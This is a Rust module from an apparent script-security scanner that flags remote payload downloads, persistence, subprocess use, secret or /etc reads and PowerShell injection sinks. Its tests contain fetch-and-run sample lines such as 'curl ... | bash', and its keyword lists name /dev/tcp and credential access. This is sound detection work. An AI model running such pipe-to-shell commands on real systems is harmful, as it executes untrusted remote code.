use super::patterns::{
    DEFERRED_PATTERNS, NODE_INJECTION_PATTERNS, POWERSHELL_INJECTION_PATTERNS,
    PYTHON_INJECTION_PATTERNS, REMOTE_BINARY_PATTERNS, SHELL_INJECTION_PATTERNS,
};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};

/// Extract the byte slice from `original` that corresponds to a regex match
/// found in the lowercased content.
///
/// # Contract
///
/// `lower` MUST be the result of `original.to_ascii_lowercase()` — this
/// preserves byte offsets because ASCII case folding is a 1-byte → 1-byte
/// transformation. Non-ASCII content can break this assumption (some chars
/// have different UTF-8 byte lengths in upper/lower forms), in which case
/// the helper falls back to the lowercased text rather than producing
/// out-of-bounds reads. The `debug_assert_eq!` on byte length surfaces the
/// invariant break in tests.
fn original_match_str<'a>(
    original: &'a str,
    lower: &'a str,
    matched: &regex::Match<'a>,
) -> &'a str {
    debug_assert_eq!(
        lower.len(),
        original.len(),
        "ASCII-lowercase invariant: lower.len() must equal original.len()"
    );
    if lower.len() == original.len() {
        // Safe slice on a valid char boundary: regex offsets are guaranteed
        // valid into `lower`, and ASCII byte-equivalence means they're valid
        // into `original` too.
        original
            .get(matched.start()..matched.end())
            .unwrap_or_else(|| matched.as_str())
    } else {
        // Defensive fallback (non-ASCII content); evidence loses casing but
        // we don't risk a panic.
        matched.as_str()
    }
}

pub(super) fn detect_remote_binary_downloads(
    lower: &str,
    original: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (rule_id, regex) in REMOTE_BINARY_PATTERNS.iter() {
        for matched in regex.find_iter(lower) {
            let evidence = original_match_str(original, lower, &matched);
            findings.push(
                Finding::builder(*rule_id, ThreatCategory::SupplyChain)
                    .severity(Severity::High)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Behavior)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.to_string(),
                    })
                    .artifact(
                        ArtifactKind::ReferencedArtifact,
                        Some(artifact_path.to_string()),
                    )
                    .match_value(evidence)
                    .reason("Script downloads a remote script or binary payload")
                    .build(),
            );
        }
    }
    findings
}

pub(super) fn detect_deferred_execution(
    lower: &str,
    original: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (rule_id, regex) in DEFERRED_PATTERNS.iter() {
        for matched in regex.find_iter(lower) {
            let evidence = original_match_str(original, lower, &matched);
            findings.push(
                Finding::builder(*rule_id, ThreatCategory::PrivilegeEscalation)
                    .severity(Severity::Medium)
                    .action(RecommendedAction::Block)
                    .evidence_kind(EvidenceKind::Behavior)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.to_string(),
                    })
                    .artifact(
                        ArtifactKind::ReferencedArtifact,
                        Some(artifact_path.to_string()),
                    )
                    .match_value(evidence)
                    .reason("Script configures deferred execution or persistence")
                    .build(),
            );
        }
    }
    findings
}

pub(super) fn detect_node_process_exec(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "js" | "ts" | "mjs" | "cjs" | "mts" | "cts")
        || !(content_lower.contains("child_process")
            || content_lower.contains("exec(")
            || content_lower.contains("spawn("))
    {
        return Vec::new();
    }
    // Indicators paired with `child_process` / `exec(` / `spawn(` that
    // escalate `SCRIPT_NODE_PROCESS_EXEC` from Severity::Low/Log to
    // Severity::Medium/Block. Each entry MUST carry an explicit boundary
    // (trailing space, embedded `:`, or `.exe`) or be a unique multi-word
    // phrase — bare interpreter names like `"bash"` or `"sh"` would match
    // common identifiers (`bashConfig`, `bashly`, `// bash compatibility`)
    // and silently flip the qualitative finding state on weak evidence.
    const RISKY_INDICATORS: &[&str] = &[
        "curl ",
        "wget ",
        "http://",
        "https://",
        "bash ",
        "sh ",
        "powershell",
        "cmd.exe",
        "invoke-webrequest",
    ];
    let risky_indicator = RISKY_INDICATORS
        .iter()
        .find(|needle| content_lower.contains(**needle))
        .copied();
    let risky_process_exec = risky_indicator.is_some();
    vec![
        Finding::builder("SCRIPT_NODE_PROCESS_EXEC", ThreatCategory::RemoteExec)
            .severity(if risky_process_exec {
                Severity::Medium
            } else {
                Severity::Low
            })
            .action(if risky_process_exec {
                RecommendedAction::Block
            } else {
                RecommendedAction::Log
            })
            .evidence_kind(if risky_process_exec {
                EvidenceKind::Behavior
            } else {
                EvidenceKind::Context
            })
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.to_string(),
            })
            .artifact(
                ArtifactKind::ReferencedArtifact,
                Some(artifact_path.to_string()),
            )
            .match_value(risky_indicator.unwrap_or("child_process"))
            .reason(if risky_process_exec {
                "Node script spawns subprocesses with shell or network execution semantics"
            } else {
                "Node script spawns local subprocesses"
            })
            .build(),
    ]
}

pub(super) fn detect_python_exec_network(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if language != "py" {
        return Vec::new();
    }
    let has_exec = content_lower.contains("subprocess.") || content_lower.contains("os.system(");
    let has_network = content_lower.contains("requests.get(")
        || content_lower.contains("requests.post(")
        || content_lower.contains("urllib.request")
        || content_lower.contains("httpx.");
    if has_exec && has_network {
        vec![
            Finding::builder("SCRIPT_PYTHON_EXEC_NETWORK", ThreatCategory::RemoteExec)
                .severity(Severity::Medium)
                .action(RecommendedAction::RequireApproval)
                .evidence_kind(EvidenceKind::Behavior)
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.to_string(),
                })
                .artifact(
                    ArtifactKind::ReferencedArtifact,
                    Some(artifact_path.to_string()),
                )
                .match_value("subprocess+network")
                .reason("Python script combines execution and network primitives")
                .build(),
        ]
    } else if has_exec {
        vec![
            Finding::builder("SCRIPT_PYTHON_EXEC", ThreatCategory::RemoteExec)
                .severity(Severity::Low)
                .action(RecommendedAction::Log)
                .evidence_kind(EvidenceKind::Context)
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.to_string(),
                })
                .artifact(
                    ArtifactKind::ReferencedArtifact,
                    Some(artifact_path.to_string()),
                )
                .match_value("subprocess")
                .reason("Python script uses execution primitives")
                .build(),
        ]
    } else {
        Vec::new()
    }
}

pub(super) fn detect_python_secret_system_access(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if language != "py"
        || !(content_lower.contains("open(\"/etc/")
            || content_lower.contains("open('/etc/")
            || content_lower.contains("os.getenv(")
            || content_lower.contains("pathlib.path.home()")
            || content_lower.contains("os.environ"))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_PYTHON_SECRET_OR_SYSTEM_ACCESS",
        ThreatCategory::CredentialExposure,
    )
    .severity(Severity::Medium)
    .action(RecommendedAction::RequireApproval)
    .evidence_kind(EvidenceKind::Behavior)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("python secret/system access")
    .reason("Python script reads environment variables, home paths, or system files")
    .build()]
}

pub(super) fn detect_powershell_dynamic_exec(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if language != "ps1"
        || !(content_lower.contains("start-process")
            || content_lower.contains("invoke-expression")
            || content_lower.contains("iex "))
    {
        return Vec::new();
    }
    vec![
        Finding::builder("SCRIPT_POWERSHELL_EXEC", ThreatCategory::RemoteExec)
            .severity(Severity::High)
            .action(RecommendedAction::RequireApproval)
            .evidence_kind(EvidenceKind::Behavior)
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.to_string(),
            })
            .artifact(
                ArtifactKind::ReferencedArtifact,
                Some(artifact_path.to_string()),
            )
            .match_value("Start-Process/IEX")
            .reason("PowerShell script executes commands dynamically")
            .build(),
    ]
}

pub(super) fn detect_powershell_persistence(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if language != "ps1"
        || !(content_lower.contains("new-itemproperty")
            || content_lower.contains("set-itemproperty")
            || content_lower.contains("scheduledtask")
            || content_lower.contains("register-scheduledtask"))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_POWERSHELL_PERSISTENCE",
        ThreatCategory::PrivilegeEscalation,
    )
    .severity(Severity::High)
    .action(RecommendedAction::RequireApproval)
    .evidence_kind(EvidenceKind::Behavior)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("registry/scheduled task persistence")
    .reason("PowerShell script configures persistence via registry or scheduled tasks")
    .build()]
}

pub(super) fn detect_shell_side_effects(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "sh" | "bash" | "zsh")
        || !(content_lower.contains("chmod +x")
            || content_lower.contains("nohup ")
            || content_lower.contains("/dev/tcp/"))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_SHELL_INSTALL_SIDE_EFFECT",
        ThreatCategory::SupplyChain,
    )
    .severity(Severity::Low)
    .action(RecommendedAction::Log)
    .evidence_kind(EvidenceKind::Context)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("shell side effects")
    .reason("Shell script changes execution mode or runs detached install-time commands")
    .build()]
}

pub(super) fn detect_shell_persistence_write(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "sh" | "bash" | "zsh")
        || !(content_lower.contains("> /etc/")
            || content_lower.contains("tee /etc/")
            || content_lower
                .lines()
                .any(|line| line.contains("echo ") && line.contains(">> ~/.")))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_SHELL_PERSISTENCE_WRITE",
        ThreatCategory::PrivilegeEscalation,
    )
    .severity(Severity::High)
    .action(RecommendedAction::RequireApproval)
    .evidence_kind(EvidenceKind::Behavior)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("shell persistence write")
    .reason("Shell script writes to startup or system configuration paths")
    .build()]
}

pub(super) fn detect_node_secret_fs_access(
    content_lower: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    if !matches!(language, "js" | "ts" | "mjs" | "cjs" | "mts" | "cts")
        || !((content_lower.contains("process.env")
            && (content_lower.contains("token")
                || content_lower.contains("secret")
                || content_lower.contains("cookie")
                || content_lower.contains("session")
                || content_lower.contains("auth")))
            || content_lower.contains("fs.readfilesync(process.env")
            || content_lower.contains("fs.readfilesync(\"/etc/")
            || content_lower.contains("fs.readfilesync('/etc/"))
    {
        return Vec::new();
    }
    vec![Finding::builder(
        "SCRIPT_NODE_SECRET_OR_FS_ACCESS",
        ThreatCategory::CredentialExposure,
    )
    .severity(Severity::Medium)
    .action(RecommendedAction::Block)
    .evidence_kind(EvidenceKind::Behavior)
    .matched_on(MatchTarget::ReferencedFile {
        path: artifact_path.to_string(),
    })
    .artifact(
        ArtifactKind::ReferencedArtifact,
        Some(artifact_path.to_string()),
    )
    .match_value("process.env/fs access")
    .reason("Node script accesses environment variables or sensitive filesystem paths")
    .build()]
}

pub(super) fn detect_injection_patterns(
    lower: &str,
    original: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<Finding> {
    let patterns: &[(&str, regex::Regex)] = match language {
        "sh" | "bash" | "zsh" => &SHELL_INJECTION_PATTERNS,
        "py" => &PYTHON_INJECTION_PATTERNS,
        "js" | "ts" | "mjs" | "cjs" | "mts" | "cts" => &NODE_INJECTION_PATTERNS,
        "ps1" => &POWERSHELL_INJECTION_PATTERNS,
        _ => &[],
    };
    let mut findings = Vec::new();
    for (rule_id, regex) in patterns {
        for matched in regex.find_iter(lower) {
            let evidence = original_match_str(original, lower, &matched);
            findings.push(
                Finding::builder(*rule_id, ThreatCategory::RemoteExec)
                    .severity(Severity::High)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Behavior)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.to_string(),
                    })
                    .artifact(ArtifactKind::ReferencedArtifact, Some(artifact_path.to_string()))
                    .match_value(evidence)
                    .reason("Script contains an execution sink that appears to be influenced by variable or user-controlled input")
                    .build(),
            );
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Contract: when a detector matches against the lowercased content, the
    /// emitted `match_value` MUST preserve the original casing of the source
    /// file. The auditor regression: `match_value` was the lowercased slice,
    /// degrading evidence and breaking waiver fingerprints if a user
    /// refactored the file's casing.
    #[test]
    fn detect_remote_binary_downloads_preserves_original_casing() {
        let original = "RUN curl -sSL https://Example.COM/Install.SH | bash\n";
        let lower = original.to_ascii_lowercase();
        let findings = detect_remote_binary_downloads(&lower, original, "/tmp/install.sh");
        assert!(!findings.is_empty(), "must match the curl|bash pattern");
        for f in &findings {
            // The match_value substring MUST exist verbatim in the original
            // (case-preserved). Lowercased fragments would not match.
            assert!(
                original.contains(&f.match_value),
                "match_value '{}' must appear verbatim in the original; \
                 got '{f}' which is lowercased.",
                f.match_value,
                f = f.match_value
            );
        }
    }

    #[test]
    fn original_match_str_falls_back_safely_on_nonascii_breakage() {
        // Non-ASCII content where lowercase changes byte length is rare for
        // the patterns we use, but we exercise the fallback path here.
        // Construct a string where lower != original byte length (Turkish I).
        let original = "İSTANBUL CURL X";
        let lower = original.to_ascii_lowercase();
        if lower.len() == original.len() {
            // ASCII path — nothing to test for fallback. Skip.
            return;
        }
        // Use a Match against `lower` and verify we don't panic and produce
        // a deterministic result.
        let re = regex::Regex::new("curl").unwrap();
        if let Some(m) = re.find(&lower) {
            let evidence = original_match_str(original, &lower, &m);
            // Either matches the original-cased "CURL" (if the byte length
            // happens to align) or falls back to the lowercased "curl"; both
            // are non-panicking outcomes.
            assert!(["curl", "CURL"].contains(&evidence));
        }
    }

    /// Contract: a JS file that mentions `bash` only as part of an
    /// identifier or unbroken token (`bashConfig`, `bashly`, `bashlib`,
    /// `bash-style`) MUST NOT escalate `SCRIPT_NODE_PROCESS_EXEC` from
    /// Severity::Low / Action::Log to Severity::Medium / Action::Block.
    /// The pre-fix `RISKY_INDICATORS` list contained the bare token
    /// `"bash"`, so common identifiers and library names would flip the
    /// qualitative finding state on weak evidence. Adding the trailing
    /// space (`"bash "`) preserves the boundary that every other entry
    /// in the list already encodes.
    ///
    /// This guards the identifier vector specifically; the substring
    /// detector cannot disambiguate English prose like `// bash
    /// compatibility` (with a literal space after `bash`), and that
    /// remains a known limitation of the substring approach.
    #[test]
    fn detect_node_process_exec_keeps_severity_low_for_bare_bash_identifier() {
        let content = "const { exec } = require('child_process');\n\
                       const bashConfig = require('./bashlib.js');\n\
                       exec('echo hi');\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Low,
            "`bashConfig` / `bashlib` identifiers must NOT escalate severity \
             (bare `bash` token vector); got {:?}",
            findings[0].severity,
        );
        assert_eq!(findings[0].recommended_action, RecommendedAction::Log);
    }

    /// Contract: a real `bash -c "..."` invocation still escalates
    /// severity to Medium and action to Block. Anchors that the
    /// boundary-tightened `"bash "` pattern catches the genuine
    /// risky case.
    #[test]
    fn detect_node_process_exec_escalates_for_real_bash_invocation() {
        let content = "const { exec } = require('child_process');\n\
                       exec('bash -c \"curl http://x.example | sh\"');\n";
        let lower = content.to_ascii_lowercase();
        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
    }

    /// Contract: PowerShell `Invoke-Expression` followed by a `$variable`
    /// raises `COMMAND_INJECTION_SINK_POWERSHELL` regardless of the
    /// argument-binding shape. Pre-fix the regex required `\s+` between
    /// the cmdlet and the variable, so `Invoke-Expression($cmd)` and
    /// `iex($cmd)` (paren binding, the most common evasion shape) and
    /// `Invoke-Expression "$cmd"` (string-quoted binding) all silently
    /// failed to match. Each of these is a positive case the new regex
    /// must accept.
    #[test]
    fn detect_injection_patterns_powershell_accepts_paren_quote_and_alias() {
        let positives = [
            ("$x = 'Get-Process'\nInvoke-Expression $x\n", "space"),
            ("$x = 'Get-Process'\nInvoke-Expression($x)\n", "paren"),
            ("$x = 'Get-Process'\niex($x)\n", "alias paren"),
            ("$x = 'Get-Process'\niex $x\n", "alias space"),
            (
                "$x = 'Get-Process'\nInvoke-Expression \"$x\"\n",
                "double-quote",
            ),
            (
                "$x = 'Get-Process'\nInvoke-Expression '$x'\n",
                "single-quote",
            ),
        ];
        for (script, label) in positives {
            let lower = script.to_ascii_lowercase();
            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == "COMMAND_INJECTION_SINK_POWERSHELL"),
                "{label}: must raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
            );
        }
    }

    /// Contract: the PowerShell injection regex MUST NOT fire on
    /// substrings of unrelated identifiers (`apex`, `complex`, `vertex`,
    /// `Invoke-Expression-Helper-Comment`-shaped log lines). Without
    /// `\b` word-boundaries the relaxed pattern would over-fire on
    /// `apex $x` or `complex$x`.
    #[test]
    fn detect_injection_patterns_powershell_does_not_overmatch_substrings() {
        let negatives = [
            "$apex = 1\napex $other\n",       // identifier ending with `iex`-like
            "$x = 1\ncomplex $x\n",           // word containing `iex` substring
            "Write-Host 'iex documentation'", // string literal mention only
        ];
        for script in negatives {
            let lower = script.to_ascii_lowercase();
            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
            assert!(
                findings
                    .iter()
                    .all(|f| f.rule_id != "COMMAND_INJECTION_SINK_POWERSHELL"),
                "must NOT raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
            );
        }
    }
}
